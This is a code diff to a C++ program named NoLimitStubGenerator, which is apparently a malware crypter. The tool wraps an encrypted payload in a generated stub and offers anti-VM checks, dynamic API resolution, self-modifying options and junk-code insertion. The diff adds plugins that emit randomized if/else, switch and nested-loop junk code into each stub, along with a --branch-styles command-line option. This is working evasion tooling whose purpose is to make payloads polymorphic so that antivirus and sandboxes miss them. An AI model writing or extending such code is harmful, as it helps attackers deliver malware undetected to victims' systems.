@@ -21,6 +21,88 @@
 #include <sys/stat.h>
 #endif
 
+// Lightweight plugin interface for generating branch-style junk code
+struct BranchStylePlugin {
+    virtual ~BranchStylePlugin() = default;
+    virtual const char* name() const = 0;
+    virtual std::string generate(
+        const std::function<std::string()>& generateVarName,
+        const std::function<uint64_t()>& getRandom
+    ) const = 0;
+};
+
+// Built-in plugin: if/else cascade with varied comparisons and side effects
+class IfElseCascadePlugin : public BranchStylePlugin {
+public:
+    const char* name() const override { return "ifelse"; }
+    std::string generate(const std::function<std::string()>& gen,
+                         const std::function<uint64_t()>& rnd) const override {
+        std::stringstream ss;
+        std::string a = gen();
+        std::string b = gen();
+        std::string c = gen();
+        int v1 = static_cast<int>(rnd() % 1000);
+        int v2 = static_cast<int>(rnd() % 1000);
+        int v3 = static_cast<int>(rnd() % 1000);
+        ss << "int " << a << " = " << v1 << ";\n";
+        ss << "int " << b << " = " << v2 << ";\n";
+        ss << "int " << c << " = 0;\n";
+        ss << "if (" << a << " > " << b << ") {\n";
+        ss << "    " << c << " = " << a << " - " << b << ";\n";
+        ss << "} else if (" << a << " == " << v3 << ") {\n";
+        ss << "    " << c << " = (" << a << " ^ " << v3 << ") & 0xFF;\n";
+        ss << "} else {\n";
+        ss << "    " << c << " = (" << b << " + " << v3 << ") % 257;\n";
+        ss << "}\n";
+        return ss.str();
+    }
+};
+
+// Built-in plugin: dense switch-case with fallthrough prevention
+class SwitchDensePlugin : public BranchStylePlugin {
+public:
+    const char* name() const override { return "switch"; }
+    std::string generate(const std::function<std::string()>& gen,
+                         const std::function<uint64_t()>& rnd) const override {
+        std::stringstream ss;
+        std::string idx = gen();
+        std::string acc = gen();
+        int base = static_cast<int>(rnd() % 7);
+        ss << "int " << idx << " = " << base << ";\n";
+        ss << "int " << acc << " = 0;\n";
+        ss << "switch (" << idx << ") {\n";
+        for (int i = 0; i < 5; ++i) {
+            int val = static_cast<int>((rnd() + i) % 9);
+            ss << "  case " << val << ": { " << acc << " += " << (val * 3 + 1) << "; break; }\n";
+        }
+        ss << "  default: { " << acc << " ^= 0x5A; break; }\n";
+        ss << "}\n";
+        return ss.str();
+    }
+};
+
+// Built-in plugin: loop guard with nested conditions
+class LoopGuardPlugin : public BranchStylePlugin {
+public:
+    const char* name() const override { return "loopguard"; }
+    std::string generate(const std::function<std::string()>& gen,
+                         const std::function<uint64_t()>& rnd) const override {
+        std::stringstream ss;
+        std::string sum = gen();
+        std::string iVar = gen();
+        std::string jVar = gen();
+        int outer = static_cast<int>(5 + (rnd() % 5));
+        int inner = static_cast<int>(3 + (rnd() % 5));
+        ss << "int " << sum << " = 0;\n";
+        ss << "for (int " << iVar << " = 0; " << iVar << " < " << outer << "; ++" << iVar << ") {\n";
+        ss << "  for (int " << jVar << " = 0; " << jVar << " < " << inner << "; ++" << jVar << ") {\n";
+        ss << "    if (((" << iVar << "+" << jVar << ") & 1) == 0) { " << sum << "+= (" << iVar << " ^ " << jVar << "); }\n";
+        ss << "  }\n";
+        ss << "}\n";
+        return ss.str();
+    }
+};
+
 class NoLimitStubGenerator {
 private:
     // Dynamic entropy collector
@@ -126,6 +208,41 @@ private:
     std::mt19937_64 primaryRng;
     std::mt19937 secondaryRng;
     std::minstd_rand fallbackRng;
+
+    // Branch style plugins
+    std::vector<std::shared_ptr<BranchStylePlugin>> branchStylePlugins;
+    std::vector<std::shared_ptr<BranchStylePlugin>> activeBranchStylePlugins;
+
+    void registerDefaultBranchStylePlugins() {
+        branchStylePlugins.clear();
+        branchStylePlugins.emplace_back(std::make_shared<IfElseCascadePlugin>());
+        branchStylePlugins.emplace_back(std::make_shared<SwitchDensePlugin>());
+        branchStylePlugins.emplace_back(std::make_shared<LoopGuardPlugin>());
+        // Enable all by default
+        activeBranchStylePlugins = branchStylePlugins;
+    }
+
+    void enableBranchStylePlugins(const std::vector<std::string>& names) {
+        if (names.empty()) {
+            activeBranchStylePlugins = branchStylePlugins;
+            return;
+        }
+        if (names.size() == 1 && (names[0] == "all" || names[0] == "*")) {
+            activeBranchStylePlugins = branchStylePlugins;
+            return;
+        }
+        activeBranchStylePlugins.clear();
+        for (const auto& n : names) {
+            for (const auto& p : branchStylePlugins) {
+                if (n == p->name()) {
+                    activeBranchStylePlugins.push_back(p);
+                }
+            }
+        }
+        if (activeBranchStylePlugins.empty()) {
+            activeBranchStylePlugins = branchStylePlugins;
+        }
+    }
     
     // Initialize with maximum entropy
     void initializeGenerators() {
@@ -316,11 +433,22 @@ private:
                     ss << generateVarName() << ".reserve(" << (getDynamicRandom() % 100) << ");\n";
                     break;
                     
-                case 4: // Conditional branches
-                    ss << "if (" << (getDynamicRandom() % 1000) << " > " 
-                       << (getDynamicRandom() % 1000) << ") {\n";
-                    ss << "    volatile int x = " << (getDynamicRandom() % 100) << ";\n";
-                    ss << "}\n";
+                case 4: // Conditional branches via plugins
+                    if (!activeBranchStylePlugins.empty()) {
+                        // Randomly choose a plugin
+                        size_t idx = static_cast<size_t>(getDynamicRandom() % activeBranchStylePlugins.size());
+                        const auto& plugin = activeBranchStylePlugins[idx];
+                        ss << plugin->generate(
+                            [this]() { return this->generateVarName(); },
+                            [this]() { return this->getDynamicRandom(); }
+                        );
+                    } else {
+                        // Fallback simple branch
+                        ss << "if (" << (getDynamicRandom() % 1000) << " > " 
+                           << (getDynamicRandom() % 1000) << ") {\n";
+                        ss << "    volatile int x = " << (getDynamicRandom() % 100) << ";\n";
+                        ss << "}\n";
+                    }
                     break;
                     
                 default:
@@ -494,6 +622,12 @@ void chacha20_decrypt(uint8_t* data, size_t len, const uint8_t key[32], const ui
 public:
     NoLimitStubGenerator() {
         initializeGenerators();
+        registerDefaultBranchStylePlugins();
+    }
+
+    // Public wrapper to configure active branch style plugins by name
+    void setBranchStylePluginsByName(const std::vector<std::string>& names) {
+        enableBranchStylePlugins(names);
     }
     
     struct StubOptions {
@@ -507,12 +641,16 @@ public:
         bool dynamicAPI = true;
         bool selfModifying = false;
         size_t maxSize = 0;  // 0 = no limit
+        std::string branchStylesCsv = "all"; // comma-separated list of branch style plugins
     };
     
     std::string generateUnlimitedStub(const std::vector<uint8_t>& payload, 
-                                     const StubOptions& options = StubOptions()) {
+                                     const StubOptions& options) {
         // Reseed with fresh entropy for each generation
         initializeGenerators();
+        
+        // Ensure branch style plugins are enabled per options
+        // (Parsing is done in main; here we keep existing active selection)
         
         // Select encryption method based on entropy
         EncryptionMethod primaryMethod = static_cast<EncryptionMethod>(
@@ -802,7 +940,7 @@ bool isVirtualMachine() {
     std::vector<uint8_t> encryptPayload(const std::vector<uint8_t>& payload, 
                                         EncryptionMethod method,
                                         const std::vector<uint8_t>& key,
-                                        const std::vector<uint8_t>& nonce) {
+                                        const std::vector<uint8_t>& /*nonce*/) {
         std::vector<uint8_t> encrypted = payload;
         
         switch (method) {
@@ -869,6 +1007,8 @@ int main(int argc, char* argv[]) {
         std::cout << "  --no-antivm                      Disable anti-VM" << std::endl;
         std::cout << "  --junk <0-10>                    Junk code complexity (default: 3)" << std::endl;
         std::cout << "  --multi-encrypt                  Use multiple encryption layers" << std::endl;
+        std::cout << "  --branch-styles <list>           Comma-separated branch style plugins (default: all)\n"
+                  << "                                     Built-ins: ifelse,switch,loopguard" << std::endl;
         return 1;
     }
     
@@ -903,7 +1043,23 @@ int main(int argc, char* argv[]) {
             options.junkComplexity = std::stoi(argv[++i]);
         } else if (arg == "--multi-encrypt") {
             options.useMultipleEncryption = true;
+        } else if (arg == "--branch-styles" && i + 1 < argc) {
+            options.branchStylesCsv = argv[++i];
         }
+    }
+
+    // Enable branch style plugins per options
+    {
+        std::vector<std::string> names;
+        std::stringstream ss(options.branchStylesCsv);
+        std::string item;
+        while (std::getline(ss, item, ',')) {
+            if (!item.empty()) names.push_back(item);
+        }
+        if (names.empty()) names.push_back("all");
+        // Access to enable function is needed; we can do this by a lambda within this scope
+        // Enable using a public wrapper
+        generator.setBranchStylePluginsByName(names);
     }
     
     // Generate stub
